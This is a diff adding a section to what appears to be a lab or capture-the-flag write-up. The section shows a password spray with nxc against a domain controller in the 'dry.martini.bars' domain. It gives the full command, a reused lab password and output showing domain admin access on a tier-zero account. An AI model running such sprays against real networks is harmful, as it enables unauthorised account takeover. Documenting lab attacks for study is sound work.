@@ -346,7 +346,20 @@ However on this occasion this attack path is not valid because i already have a 
 
 # Domain admin via password spray
 
-Since i know the password for the account `athena_svc` 
+Since i know the password for the account `athena_svc` its possible there is password reuse on the account `athena.t0` which as the name implies is a tier zero account and is in the domain admins group
+
+```python
+nxc smb dc01.dry.martini.bars -u users.txt -p '1dirtymartini' --continue-on-success --smb-timeout 5
+SMB         10.1.33.56      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
+SMB         10.1.33.56      445    DC01             [-] DRY.MARTINI.BARS\Administrator:1dirtymartini STATUS_LOGON_FAILURE 
+SMB         10.1.33.56      445    DC01             [-] DRY.MARTINI.BARS\Guest:1dirtymartini STATUS_LOGON_FAILURE 
+SMB         10.1.33.56      445    DC01             [-] DRY.MARTINI.BARS\krbtgt:1dirtymartini STATUS_LOGON_FAILURE 
+SMB         10.1.33.56      445    DC01             [-] DRY.MARTINI.BARS\DC01$:1dirtymartini STATUS_LOGON_FAILURE 
+SMB         10.1.33.56      445    DC01             [-] DRY.MARTINI.BARS\mprice:1dirtymartini STATUS_LOGON_FAILURE 
+SMB         10.1.33.56      445    DC01             [+] DRY.MARTINI.BARS\athena.t0:1dirtymartini (Pwn3d!)
+SMB         10.1.33.56      445    DC01             [+] DRY.MARTINI.BARS\ATHENA_SVC:1dirtymartini
+```
+
 
 
 
